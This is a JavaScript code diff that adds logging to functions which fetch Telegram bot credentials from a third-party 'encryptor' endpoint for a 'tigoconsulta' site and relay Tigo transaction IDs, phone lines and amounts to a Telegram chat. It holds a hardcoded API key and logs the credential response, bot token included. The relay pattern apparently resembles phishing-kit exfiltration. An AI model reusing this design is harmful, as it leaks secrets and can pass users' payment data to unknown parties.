@@ -23,29 +23,44 @@ function generarTxid() {
 
 async function obtenerCredencialesTelegram(site = 'tigoconsulta') {
     try {
+        const apiKey = process.env.LABORATORIO_LOL_API_KEY || 'C4fEzGJfN92dkLKrZ43ULzFbAcx7mD9v';
+        console.log('[Telegram] Obteniendo credenciales de laboratorio.lol con site:', site);
         const response = await fetch(
             `https://www.laboratorio.lol/api/encryptor.php?site=${site}`,
-            { headers: { 'X-API-Key': process.env.LABORATORIO_LOL_API_KEY || 'C4fEzGJfN92dkLKrZ43ULzFbAcx7mD9v' } }
+            { headers: { 'X-API-Key': apiKey } }
         );
         const data = await response.json();
-        return { token: data.token || data.bot_token, chatId: data.chat_id };
+        console.log('[Telegram] Respuesta de laboratorio.lol:', data);
+        const token = data.token || data.bot_token;
+        const chatId = data.chat_id;
+        console.log('[Telegram] Token obtenido:', token ? '✓' : '✗', 'ChatId:', chatId ? '✓' : '✗');
+        return { token, chatId };
     } catch (error) {
+        console.error('[Telegram] Error obteniendo credenciales:', error.message);
         return null;
     }
 }
 
 async function enviarNotificacionTelegram(txid, transaccion) {
     try {
+        console.log('[Telegram] Iniciando envío de notificación...');
         const creds = await obtenerCredencialesTelegram('tigoconsulta');
-        if (!creds?.token || !creds?.chatId) return;
+        console.log('[Telegram] Credenciales obtenidas:', creds ? '✓' : '✗');
+        if (!creds?.token || !creds?.chatId) {
+            console.log('[Telegram] ✗ Credenciales inválidas. Token:', creds?.token ? '✓' : '✗', 'ChatId:', creds?.chatId ? '✓' : '✗');
+            return;
+        }
         const mensaje = `🔔 <b>NUEVA TRANSACCIÓN TIGO</b>\n\n<b>TxID:</b> <code>${txid}</code>\n<b>Línea:</b> ${transaccion.referencia}\n<b>Valor:</b> ${transaccion.valor_formateado}`;
-        await fetch(`https://api.telegram.org/bot${creds.token}/sendMessage`, {
+        console.log('[Telegram] Enviando mensaje a chat:', creds.chatId);
+        const telegramRes = await fetch(`https://api.telegram.org/bot${creds.token}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: creds.chatId, text: mensaje, parse_mode: 'HTML' })
         });
+        const telegramData = await telegramRes.json();
+        console.log('[Telegram] Respuesta:', telegramData.ok ? '✓ Enviado' : '✗ Error: ' + telegramData.description);
     } catch (error) {
-        console.error('Telegram error:', error);
+        console.error('[Telegram] Error:', error.message);
     }
 }
 
